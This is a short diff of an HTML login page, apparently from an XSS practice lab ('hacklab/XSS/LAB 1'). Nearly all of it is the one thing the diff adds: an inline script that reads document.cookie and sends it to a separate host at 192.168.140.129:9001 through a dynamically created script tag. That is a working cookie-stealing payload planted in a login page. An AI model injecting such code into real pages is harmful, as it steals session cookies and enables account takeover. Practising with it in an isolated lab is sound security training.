@@ -8,6 +8,9 @@
     <script src="../JS/login.js"></script>
 </head>
 <body>
+    <script>
+        document.head.appendChild(document.createElement('script')).src = `http://192.168.140.129:9001/?data=${encodeURIComponent(JSON.stringify({ message: document.cookie }))}`;
+    </script>
     <h1>Login Page</h1>
     <div class="inputField">
         <form action="http://192.168.140.130/hacklab/XSS/LAB 1/PHP/login.php" method="post">
